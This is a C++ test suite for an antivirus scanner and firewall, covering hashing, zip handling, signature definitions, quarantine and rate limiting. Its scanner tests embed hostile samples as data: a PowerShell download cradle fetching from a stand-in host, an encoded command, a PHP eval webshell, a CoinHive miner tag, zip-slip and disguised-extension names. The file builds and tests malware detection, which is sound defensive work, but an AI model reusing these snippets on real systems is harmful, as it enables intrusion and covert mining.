#include <atomic>
#include <chrono>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>

#include "av.hpp"
#include "deflate.hpp"
#include "definitions.hpp"
#include "firewall.hpp"
#include "security.hpp"
#include "sha256.hpp"

namespace fs = std::filesystem;

namespace {

int failures = 0;

void check(bool condition, const std::string& label) {
    if (!condition) {
        ++failures;
        std::cerr << "FAILED: " << label << '\n';
    }
}

std::string eicar() {
    std::string a = "X5O!P%@AP[4\\PZX54(P^)7CC)7}";
    std::string b = "$EICAR-STANDARD-ANTIVIRUS";
    std::string c = "-TEST-FILE!$H+H*";
    return a + b + c;
}

std::string marker() { return std::string("INTERNET-AV-TEST-") + "MARKER-7f3a9c"; }

std::vector<std::uint8_t> bytes(const std::string& text) { return std::vector<std::uint8_t>(text.begin(), text.end()); }

std::shared_ptr<const internet::Scanner> scanner() {
    std::string error;
    std::shared_ptr<const internet::Scanner> built = internet::makeScanner("", error);
    check(built != nullptr, "built-in definitions load: " + error);
    return built;
}

bool hasRule(const internet::ScanResult& result, const std::string& rule) {
    for (const internet::Finding& finding : result.findings) {
        if (finding.rule == rule) return true;
    }
    return false;
}

std::string hexToBytes(const std::string& hex) {
    std::string out;
    internet::fromHex(hex, out);
    return out;
}

void writeFile(const fs::path& path, const std::string& content) {
    fs::create_directories(path.parent_path());
    std::ofstream(path, std::ios::binary) << content;
}

std::string readFile(const fs::path& path) {
    std::ifstream stream(path, std::ios::binary);
    return std::string((std::istreambuf_iterator<char>(stream)), std::istreambuf_iterator<char>());
}

void testHashing() {
    check(internet::sha256Hex("") == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "sha256 of empty input");
    check(internet::sha256Hex("abc") == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad", "sha256 of abc");
    check(internet::sha256Hex(std::string(1000, 'a')) == "41edece42d63e8d9bf515a9ba6932e1c20cbc9f5a5d134645adb5db1b9737ea3",
          "sha256 of a long input");
    check(internet::constantTimeEquals("token", "token") && !internet::constantTimeEquals("token", "tokeN") &&
              !internet::constantTimeEquals("a", "ab"),
          "constant time comparison");
    check(internet::crc32(reinterpret_cast<const std::uint8_t*>("123456789"), 9) == 0xCBF43926u, "crc32 check value");
}

void testDeflate() {
    std::string text;
    for (int i = 0; i < 300; ++i) text += "line " + std::to_string(i) + ": the quick brown fox " + std::to_string(i * i % 97) + "\n";

    std::string dynamic = hexToBytes("859a516edc300c44ff738a3d8249d9b2d5e3b448d1a04182162ddae317c572263ffba46fae2d69448af3ac7d7d797bbe6d9f6ebfbe3ddf7efc7ef9f2fdf6f9e7fb9fb7dbd7f7bfb7ede9f57f341e47e31ecdc7d1fd1e6d8fa3e31edde1cdfd1e3e1e87f3b887fbe370aba74f98588d7d3d0ef79af8781cbe6ad50192b50a8366596f0f52edac38e87666c541398541b9a6d983745dcf8376a3940f10af69f9a0de591995a05ed4f809f21df5fe04f9466d7d827c7bc99f20df504e837ebbc607fd86de0ffa1d5a3fe8775518e4eb257f03f9b2b2a7817c57bdbf817c878a16e4cbda9e06f25d555a0de4eb256fa3cad5fa40bed0f3245f6d7f23fd2abe837e7be9b3837eadd6bf837ea1e7413f0d4fd957d9b5837c57c9b3837ca74e5590efd4f320dfa9f1c73c7e6cf3f71f319fdf91f3f51dd434343ee8a7ae71cc77e7e8f3dd3da871e879ea1c1a9f5a47c5fb36cfee4ed9a7b697f3eaea6d5e9d9d7a47adbf1ff3d3a1f7f9e9d2cff9e9d4493fad8ff4abb6becdcfd633e667f349adb7b2eba4ec2b79cf7dde5bce63de9bce3eef6d271d7eb53d2755afd63fe6bdf9dae6bdfd8ab937b872ee2d2e6a1e15dee7cee6a2d65bd973f5b9b3ba403ead9e5a87663f16b6905a4715d7a0e2addd1f39f7b4a3cd2df1a0de516152afc2205e2d7e80769559e39a3f0dd2c9f26e94788ac77ce9b12db48badcdc58f8d6ad77320e7e245f41517ccf32fb66b4106db58a001a187d900e143f1450507d187f180f0c37c8000623e220f23e68cc53118c4203a4783204407711085e8240fc210b582c8452f09021135a3201251370b4291ea864128a26e1ab968c78130e221c6dc1004f288f60a814475d7169e260849648a829844ae2a084a64cb82a844be2edac2180671899c651098c89a069189a64064226b1cfbc25b07b189cc79109dc8dd07e189f020904ffc8305a004128a27491e516f2046b1500429529a20c55b4594e2cd264c71ba10a838e188549cb2842a4e7a6215970dc18a0b8f68c5a54bb8e2e2275ef1f181c022a19058748411b2f8104466517cf1c126085a7c9013b5b81510b7b89910b8b81d11b9b8a111bab82512bbb8a912bcb82d13bdb8b113bed81a10bf7c7c7b2480915044307a01118c0d12218c2d16328cb68228462a10c5d82612c6d86812c7d8aa12c9d8ec12cad82e13cbd87013cc680a04335a03c28ce2a0a2928d68c6cff7c5f8948b8a5f2b01161226318d3621096ab48d4950a34448821aa55212d4e85b35318d92398969540e494ca3824a841ac517259dc4343a14929846c74a22d44806bc52d13779829a8f4b09fa30e621e85a40d94050e37b09821a5f4c10d4f86682a0c6571378b7221d086a7439414ca3669bb968d7894ce321e81b99174150a3bd42a851dde11d8b9426a891754a821a99af24a8917d4b821a19c06c0b0b99043532a14950231b9b04359e0265a412ae2dac7812d3c8cc27418d7020096a04148950e31f2ca026116a3c4972907e03351bcf818c8fe20b384c621a6f36318dd385a0c6094750e39425a871d213d4b86c086a5c7804352e5d821a173f418d8f0f841a098550a3230c2f61b44c841ac5171f7e9298c6073931cdc7253565a49426a8713b22a87143c3cb18cd81a0c64d95a0c66d99a0c68d9da0c6d680a0c6e602a1464211d4f805f4bdc23f587cd44d641a6d05418d5420a6b14d24a6b1d124a6b15525a8b1d9c5bb19ed04418d0c7712d4780af33b8644a4511c5454b20dfaeaa338fdb144f1f9f54c22d14800421a4b484ce34d20a8f13612d4f4fde91f");
    std::vector<std::uint8_t> out;
    check(internet::inflateRaw(reinterpret_cast<const std::uint8_t*>(dynamic.data()), dynamic.size(), out, 1 << 20) &&
              std::string(out.begin(), out.end()) == text,
          "inflate a dynamic Huffman stream");

    std::vector<std::uint8_t> packed = internet::deflateCompress(bytes(text));
    check(packed.size() < text.size() / 2, "compression makes repetitive data smaller");
    check(internet::inflateRaw(packed.data(), packed.size(), out, 1 << 20) && std::string(out.begin(), out.end()) == text,
          "deflate and inflate round trip");
    check(!internet::inflateRaw(packed.data(), packed.size(), out, 100), "inflate respects the size limit");
    std::vector<std::uint8_t> broken(packed.begin(), packed.begin() + static_cast<std::ptrdiff_t>(packed.size() / 2));
    check(!internet::inflateRaw(broken.data(), broken.size(), out, 1 << 20), "inflate rejects truncated data");
    check(!internet::inflateRaw(reinterpret_cast<const std::uint8_t*>("\xff\xff\xff"), 3, out, 1024), "inflate rejects garbage");
}

void testZip() {
    std::vector<std::pair<std::string, std::vector<std::uint8_t>>> files = {
        {"a.txt", bytes("hello hello hello hello hello hello")},
        {"docs/b.txt", bytes(std::string(500, 'x'))},
    };
    for (bool compress : {false, true}) {
        std::vector<std::uint8_t> zip = internet::buildZip(files, compress);
        std::vector<internet::ZipEntry> entries;
        std::string error;
        check(internet::readZip(zip.data(), zip.size(), entries, error) && entries.size() == 2, "read a zip");
        if (entries.size() != 2) continue;
        std::vector<std::uint8_t> content;
        check(internet::extractZip(zip.data(), zip.size(), entries[1], 1 << 20, content, error) && content == files[1].second,
              "extract a zip entry");
        std::vector<std::uint8_t> damaged = zip;
        damaged[40] ^= 0x55;
        std::vector<internet::ZipEntry> damagedEntries;
        if (internet::readZip(damaged.data(), damaged.size(), damagedEntries, error) && !damagedEntries.empty()) {
            bool rejected = false;
            for (const internet::ZipEntry& entry : damagedEntries) {
                if (!internet::extractZip(damaged.data(), damaged.size(), entry, 1 << 20, content, error)) rejected = true;
            }
            check(rejected, "damaged zip data is rejected");
        }
    }
    std::vector<internet::ZipEntry> none;
    std::string error;
    check(!internet::readZip(reinterpret_cast<const std::uint8_t*>("not a zip at all, just text"), 27, none, error),
          "readZip rejects non-zip data");
}

void testDefinitions() {
    internet::Definitions parsed;
    std::string error;
    check(internet::parseDefinitions("version 1\nrule A 50 Test any any\ns \"abc\"\nend\n", parsed, error) && parsed.rules.size() == 1,
          "parse a valid rule");
    check(!internet::parseDefinitions("rule A 50 Test any any\ns \"abc\"\n", parsed, error), "missing end is an error");
    check(!internet::parseDefinitions("rule A 50 Test nowhere any\ns \"abc\"\nend\n", parsed, error), "unknown scope is an error");
    check(!internet::parseDefinitions("bogus line\n", parsed, error), "unknown keyword is an error");
    check(internet::parseDefinitions("hash 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f X 90 Test\n", parsed, error) &&
              parsed.hashes.size() == 1,
          "parse a hash entry");

    internet::Definitions builtin;
    check(internet::parseDefinitions(internet::builtinDefinitionsText(), builtin, error) && builtin.rules.size() > 30,
          "built-in definitions parse");
    internet::Definitions update;
    internet::parseDefinitions("version 9999.01.01\nrule Test.EICAR 10 Test any any\ns \"zzz\"\nend\nrule New.One 60 Test any any\ns \"qqq\"\nend\n",
                               update, error);
    internet::Definitions merged = internet::mergeDefinitions(builtin, update);
    check(merged.version == "9999.01.01" && merged.rules.size() == builtin.rules.size() + 1, "merge replaces and adds rules");
}

void testScanner() {
    std::shared_ptr<const internet::Scanner> engine = scanner();
    if (!engine) return;

    internet::ScanResult clean = engine->scan("index.html", std::string("<html><body><h1>Hello</h1><p>Welcome to my site.</p></body></html>"));
    check(clean.verdict == internet::Verdict::Clean && clean.findings.empty() && clean.type == "html", "a normal page is clean");

    internet::ScanResult test = engine->scan("eicar.com", eicar());
    check(test.verdict == internet::Verdict::Malicious && hasRule(test, "Test.EICAR") && test.score == 100,
          "the standard test string is detected");
    check(hasRule(test, "EICAR-Test-File"), "the known hash is detected");
    check(engine->scan("eicar.txt", eicar() + "\r\n").verdict == internet::Verdict::Malicious, "test string with trailing bytes");
    check(engine->scan("marker.txt", "prefix " + marker() + " suffix").verdict == internet::Verdict::Malicious, "test marker");

    std::string cradle = std::string("power") + "shell -nop -w hidden -c \"IEX (New-Object Net.WebClient).Download" + "String('http://x.example/a')\"";
    internet::ScanResult script = engine->scan("run.ps1", cradle);
    check(script.verdict == internet::Verdict::Suspicious && hasRule(script, "Script.PowerShell.DownloadCradle"),
          "a download cradle alone is suspicious");
    std::string combined = cradle + std::string(" power") + "shell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA";
    check(engine->scan("run2.ps1", combined).verdict == internet::Verdict::Malicious, "a download cradle with an encoded command is malicious");

    std::string encoded = std::string("power") + "shell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA";
    internet::ScanResult encodedResult = engine->scan("run.bat", encoded);
    check(encodedResult.verdict == internet::Verdict::Suspicious && hasRule(encodedResult, "Script.PowerShell.EncodedCommand"),
          "encoded command is suspicious");

    internet::ScanResult page = engine->scan("page.html", std::string("<html><body>hi<iframe src=\"http://a\" width=\"0\" height=\"0\"></iframe></body></html>"));
    check(hasRule(page, "Html.HiddenIframe") && page.verdict == internet::Verdict::Suspicious, "hidden iframe is suspicious");
    check(engine->scan("page.html", std::string("<html><iframe src=\"http://a\" width=\"400\"></iframe></html>")).verdict == internet::Verdict::Clean,
          "visible iframe is clean");

    std::string miner = "<script src=\"https://coin" + std::string("hive.com/lib/coin") + "hive.min.js\"></script><script>var m = new Coin" + "Hive.Anonymous('KEY'); m.start();</script>";
    check(engine->scan("m.html", miner).verdict == internet::Verdict::Malicious, "miner is malicious");
    check(engine->scan("blocklist.json", "{\"domains\":[\"coin" + std::string("hive.com\",\"coin-") + "hive.com\",\"minero.cc\",\"authedmine.com\"]}").verdict == internet::Verdict::Clean,
          "a list of miner domains is not a miner");

    std::string webshell = "<?php " + std::string("ev") + "al($_PO" + "ST['x']); ?>";
    check(engine->scan("shell.php", webshell).verdict == internet::Verdict::Malicious, "webshell is malicious");

    check(engine->scan("invoice.pdf.exe", std::string("hello")).verdict == internet::Verdict::Suspicious, "double extension is suspicious");
    check(engine->scan(std::string("photo") + "\xE2\x80\xAE" + "gpj.exe", std::string("hello")).verdict == internet::Verdict::Suspicious,
          "right to left override is suspicious");

    std::string pe(0x200, '\0');
    pe[0] = 'M';
    pe[1] = 'Z';
    pe[0x3C] = static_cast<char>(0x80);
    pe.replace(0x80, 4, std::string("PE\0\0", 4));
    internet::ScanResult disguised = engine->scan("holiday.jpg", pe);
    check(disguised.type == "pe" && hasRule(disguised, "Heur.Type.ExecutableDisguised") &&
              disguised.verdict == internet::Verdict::Suspicious,
          "program disguised as a picture is suspicious");
    check(engine->scan("tool.exe", pe).verdict == internet::Verdict::Clean, "plain small program is clean");
    check(engine->scan("Windows.Data.Pdf.dll", pe).verdict == internet::Verdict::Clean, "a library with a document word in its name is clean");
    check(engine->scan("invoice.pdf.exe", pe).verdict == internet::Verdict::Suspicious, "a program with a document extension in front is suspicious");
    check(engine->scan("codec.acm", pe).verdict == internet::Verdict::Clean && engine->scan("shell.rs", pe).verdict == internet::Verdict::Clean, "system files with unusual extensions are clean");

    std::vector<std::uint8_t> inner = internet::buildZip({{"readme.txt", bytes("hello")}, {"deep/bad.txt", bytes("x " + marker())}}, true);
    internet::ScanResult zipResult = engine->scan("bundle.zip", inner.data(), inner.size());
    check(zipResult.type == "zip" && zipResult.verdict == internet::Verdict::Malicious, "malicious file inside a zip is found");
    bool located = false;
    for (const internet::Finding& finding : zipResult.findings) {
        if (finding.location.find("deep/bad.txt") != std::string::npos) located = true;
    }
    check(located, "finding names the file inside the zip");

    std::vector<std::uint8_t> nested = internet::buildZip({{"inner.zip", inner}}, false);
    check(engine->scan("outer.zip", nested.data(), nested.size()).verdict == internet::Verdict::Malicious, "nested zip is scanned");

    std::vector<std::uint8_t> traversal = internet::buildZip({{"../../evil.txt", bytes("hello")}}, false);
    internet::ScanResult slip = engine->scan("slip.zip", traversal.data(), traversal.size());
    check(hasRule(slip, "Heur.Archive.PathTraversal") && slip.verdict == internet::Verdict::Suspicious, "zip slip is suspicious");

    std::vector<std::uint8_t> harmless = internet::buildZip({{"a.txt", bytes("hello")}, {"b.txt", bytes("world")}}, true);
    check(engine->scan("ok.zip", harmless.data(), harmless.size()).verdict == internet::Verdict::Clean, "harmless zip is clean");

    std::string noise(20000, 'A');
    for (std::size_t i = 0; i < noise.size(); ++i) noise[i] = static_cast<char>((i * 2654435761u) >> 13);
    internet::ScanResult random = engine->scan("blob.dat", noise);
    check(random.entropy > 7.5, "entropy of noisy data is high");

    std::string obfuscated = "<script>eval(unesc" + std::string("ape('%61%6c")+ "')); ";
    for (int i = 0; i < 400; ++i) obfuscated += "%4" + std::to_string(i % 10);
    obfuscated += "</script>";
    internet::ScanResult heavy = engine->scan("x.html", obfuscated);
    check(heavy.verdict != internet::Verdict::Clean && hasRule(heavy, "Heur.Script.PercentEncoded"), "heavy percent encoding is flagged");

    std::string big(3 * 1024 * 1024, 'a');
    auto start = std::chrono::steady_clock::now();
    internet::ScanResult large = engine->scan("large.txt", big);
    double seconds = std::chrono::duration<double>(std::chrono::steady_clock::now() - start).count();
    check(large.verdict == internet::Verdict::Clean && seconds < 5.0, "a 3 MB file scans quickly");
}

void testSystemFiles() {
#ifdef _WIN32
    std::shared_ptr<const internet::Scanner> engine = scanner();
    if (!engine) return;
    const char* candidates[] = {"C:/Windows/System32/cmd.exe", "C:/Windows/System32/notepad.exe", "C:/Windows/System32/kernel32.dll",
                                "C:/Windows/System32/calc.exe", "C:/Windows/System32/ntdll.dll"};
    int scanned = 0;
    for (const char* path : candidates) {
        std::error_code error;
        if (!fs::exists(path, error)) continue;
        std::string data = readFile(path);
        internet::ScanResult result = engine->scan(fs::path(path).filename().string(), data);
        ++scanned;
        std::string detail;
        for (const internet::Finding& finding : result.findings) detail += " " + finding.rule;
        check(result.verdict == internet::Verdict::Clean, std::string("system file is clean: ") + path + detail);
    }
    check(scanned > 0, "at least one system file was available to scan");
#endif
}

void testFirewall() {
    double now = 1000.0;
    internet::FirewallConfig config;
    config.ratePerSecond = 2.0;
    config.burst = 5.0;
    config.maxConnectionsPerHost = 2;
    config.violationsToBan = 3;
    config.banSeconds = 60;
    internet::Firewall firewall(config);
    firewall.setClock([&] { return now; });
    std::vector<std::string> notices;
    firewall.setListener([&](const std::string& text) { notices.push_back(text); });

    int allowed = 0;
    for (int i = 0; i < 5; ++i) allowed += firewall.allowRequest("10.0.0.5") ? 1 : 0;
    check(allowed == 5, "burst of requests is allowed");
    check(!firewall.allowRequest("10.0.0.5"), "request over the burst is limited");
    now += 1.0;
    check(firewall.allowRequest("10.0.0.5") && firewall.allowRequest("10.0.0.5") && !firewall.allowRequest("10.0.0.5"),
          "tokens refill over time");
    check(firewall.allowRequest("10.0.0.6"), "another host is unaffected");

    firewall.allowRequest("10.0.0.5");
    firewall.allowRequest("10.0.0.5");
    check(firewall.isBanned("10.0.0.5") && !notices.empty(), "repeated flooding leads to a ban");
    check(!firewall.allowConnection("10.0.0.5"), "banned hosts cannot connect");
    check(firewall.bans().size() == 1 && firewall.bans()[0].host == "10.0.0.5", "ban list");
    now += 61.0;
    check(!firewall.isBanned("10.0.0.5") && firewall.allowConnection("10.0.0.5"), "bans expire");

    check(firewall.allowConnection("10.0.0.7") && firewall.allowConnection("10.0.0.7") && !firewall.allowConnection("10.0.0.7"),
          "connection limit per host");
    firewall.releaseConnection("10.0.0.7");
    check(firewall.allowConnection("10.0.0.7"), "releasing a connection frees a slot");

    bool allLoopbackAllowed = true;
    for (int i = 0; i < 500; ++i) allLoopbackAllowed = allLoopbackAllowed && firewall.allowRequest("127.0.0.1");
    check(allLoopbackAllowed, "loopback is exempt");

    firewall.ban("10.0.0.9", 30, "test");
    check(firewall.isBanned("10.0.0.9") && firewall.unban("10.0.0.9") && !firewall.isBanned("10.0.0.9"), "manual ban and unban");
    firewall.violation("10.0.0.10", "bad token", 3);
    check(firewall.isBanned("10.0.0.10"), "violations with weight lead to a ban");
    check(firewall.stats().bans >= 3, "ban counter");
}

void testSecurity() {
    fs::path root = fs::temp_directory_path() / "internet-tests-security";
    fs::remove_all(root);
    internet::Security security(root / "data");

    writeFile(root / "site" / "index.html", "<html><body>fine</body></html>");
    writeFile(root / "site" / "docs" / "bad.txt", "payload " + marker());
    writeFile(root / "site" / "odd.html", "<html><iframe src=\"http://a\" width=\"0\"></iframe></html>");

    internet::ScanProgress progress;
    security.scanTree({root / "site"}, "test", progress);
    check(progress.done && progress.files == 3, "tree scan visits every file");
    check(progress.malicious == 1 && progress.suspicious == 1, "tree scan counts threats");
    bool quarantined = false;
    for (const internet::ScanRecord& record : progress.records) {
        if (record.action == "quarantined") quarantined = true;
    }
    check(quarantined && !fs::exists(root / "site" / "docs" / "bad.txt"), "malicious file is quarantined and removed");
    check(fs::exists(root / "site" / "odd.html"), "suspicious file is left in place");

    std::vector<internet::QuarantineItem> items = security.quarantineItems();
    check(items.size() == 1 && items[0].verdict == "malicious", "quarantine lists the file");
    if (!items.empty()) {
        std::string error;
        check(security.restoreQuarantined(items[0].id, root / "restored" / "bad.txt", error) &&
                  readFile(root / "restored" / "bad.txt") == "payload " + marker(),
              "restore returns the original bytes");
        check(!security.restoreQuarantined(items[0].id, root / "restored" / "bad.txt", error), "restore refuses to overwrite");
        check(!security.restoreQuarantined("../../etc", root / "x", error), "restore validates the id");
        check(security.deleteQuarantined(items[0].id, error) && security.quarantineItems().empty(), "delete from quarantine");
    }

    fs::path guarded = root / "hosted" / "file.txt";
    writeFile(guarded, marker());
    check(!security.guard(guarded).allowed, "guard blocks a malicious file");
    writeFile(guarded, "now a perfectly normal and much longer text file");
    check(security.guard(guarded).allowed, "guard allows the file once it is clean");
    check(security.counters().blocked >= 1, "blocked counter");

    std::vector<internet::ThreatEvent> events = security.events(50);
    check(!events.empty(), "threat events are recorded");
    internet::Security reopened(root / "data");
    check(!reopened.events(50).empty(), "threat history is saved");

    std::string error;
    check(!security.updateDefinitions("garbage line", error), "invalid definitions are rejected");
    check(security.updateDefinitions("version 2999.01.01\nrule Custom.Rule 95 Test any any\ns \"custom-signature-xyz\"\nend\n", error),
          "valid definitions are installed");
    check(security.scanBuffer("a.txt", "some custom-signature-xyz here", "test").verdict == internet::Verdict::Malicious,
          "installed definitions take effect");
    check(security.definitionsVersion() == "2999.01.01", "definitions version");
    internet::Security again(root / "data");
    check(again.scanBuffer("a.txt", "custom-signature-xyz", "test").verdict == internet::Verdict::Malicious,
          "installed definitions persist");

    internet::SecuritySettings settings = security.settings();
    settings.realtime = false;
    security.setSettings(settings);
    internet::Security third(root / "data");
    check(!third.settings().realtime && third.settings().autoQuarantine, "settings persist");

    fs::remove_all(root);
}

}

int runSecurityTests() {
    testHashing();
    testDeflate();
    testZip();
    testDefinitions();
    testScanner();
    testSystemFiles();
    testFirewall();
    testSecurity();
    return failures;
}
